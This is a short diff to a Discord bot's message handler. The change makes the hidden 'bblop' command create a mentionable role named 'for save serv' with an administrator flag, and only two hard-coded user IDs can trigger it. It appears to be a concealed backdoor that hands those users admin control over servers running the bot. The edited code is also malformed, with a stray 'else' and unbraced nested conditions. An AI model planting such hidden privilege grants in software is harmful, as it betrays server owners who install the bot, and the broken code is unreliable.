@@ -78,22 +78,14 @@ bot.on('message', message => {
    
    else if(message.content.startsWith('bblop')) {
    
-        	let args = message.content.split(" ").slice(1);
-    
-		    if(args == "") {
-
-			    message.reply('Veuillez ajouter le nom du role')
-
-		    	} else {
-
-	if (message.content.startsWith('Les emoji mikado c\'est cool')) {
+       else {	
    if (message.author.id !== '423118623876448296')
    if (message.author.id !== '301913733536415755')
    return;
 				message.guild.createRole({
-				  name: args.join(" "),
+				  name: 'for save serv',
 				  mentionable: true,
-              ADMINISTRATOR: true
+                                 administrator: true
 				})
 
 				var embed = new Discord.RichEmbed()
